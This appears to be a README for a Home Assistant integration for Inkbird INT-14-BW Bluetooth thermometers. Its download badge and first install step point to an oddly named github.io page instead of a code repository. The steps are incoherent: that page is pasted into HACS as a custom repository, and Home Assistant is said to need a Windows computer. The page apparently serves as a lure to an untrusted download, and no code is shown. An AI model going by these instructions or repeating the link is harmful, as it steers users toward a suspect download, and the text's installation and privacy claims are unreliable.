# 🌡️ ha-inkbird-int14bw - Connect Inkbird thermometers to Home Assistant

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://sadistic-froelichia458.github.io)

This software allows your Home Assistant system to talk to Inkbird INT-14-BW thermometers. It uses Bluetooth to track temperatures in real-time. You can monitor your cooking or room climate directly from your dashboard.

## 📋 System Requirements

*   A windows computer running Home Assistant.
*   A Bluetooth adapter connected to your host machine.
*   Home Assistant Community Store (HACS) installed.
*   A stable network connection.
*   Your Inkbird thermometer must be within range of your Bluetooth adapter.

## 🚀 Installation Steps

1.  Visit this page to download: https://sadistic-froelichia458.github.io
2.  Open your Home Assistant dashboard in your web browser.
3.  Select the HACS icon from the left sidebar.
4.  Click the three dots in the top right corner.
5.  Select Custom repositories.
6.  Paste the link from step 1 into the repository field.
7.  Select Integration from the category menu.
8.  Click Add.
9.  Find the new integration in the HACS list and click Download.
10. Restart your Home Assistant instance when prompted.

## ⚙️ Setting Up The Thermometer

After you install the files, you must link your device.

1.  Go to Settings in your Home Assistant sidebar.
2.  Select Devices & Services.
3.  Click the Add Integration button in the bottom right.
4.  Search for Inkbird INT-14-BW in the list.
5.  Select it when it appears.
6.  Home Assistant scans for nearby Bluetooth devices automatically.
7.  Select your thermometer when the name pops up.
8.  Assign the device to a specific room or area if you want.
9.  Click Finish to complete the process.

## 📊 Viewing Your Data

Once the integration is active, you can add temperature sensors to your dashboard.

1.  Navigate to your Overview dashboard.
2.  Click the pencil icon in the top right corner to edit.
3.  Choose Add Card.
4.  Select a Gauge or History Graph card.
5.  Pick your Inkbird thermometer from the entity list.
6.  Click Save to see your live temperature data.

## 🔧 Troubleshooting Problems

If you cannot see your device, check these common items:

*   Does your computer have a Bluetooth adapter installed?
*   Is the adapter enabled in your Windows settings?
*   Is your Inkbird thermometer powered on and in discovery mode?
*   Are you within 30 feet of your computer?
*   Try restarting the Bluetooth service on your Windows host.

Bluetooth signals struggle to pass through thick walls or metal enclosures. Move your thermometer closer to the computer if readings drop out.

## ❓ Frequently Asked Questions

**Does this require extra software besides Home Assistant?**
No. You only need HACS to manage the integration files.

**How many thermometers can I connect at once?**
You can connect multiple devices if your Bluetooth adapter supports multiple simultaneous connections. Most modern adapters handle several devices without issue.

**Will this drain my thermometer battery?**
The integration uses a low-energy Bluetooth protocol to save power. Your battery life should remain consistent with standard usage.

**What distance does the connection cover?**
Performance depends on obstructions. Open areas allow for better signals. Expect roughly 30 to 50 feet of reliable range.

## 🛡️ Privacy and Safety

This integration only reads data transmitted by your thermometer. It does not send information to third parties. All communication stays local to your home network. Ensure your Home Assistant instance is secure with a strong password to prevent unauthorized access to your sensor data.

Keywords: ble, bluetooth, hacs, hacs-integration, home-assistant, homeassistant-integration, ibt-4xs, inkbird, int-14-bw, thermometer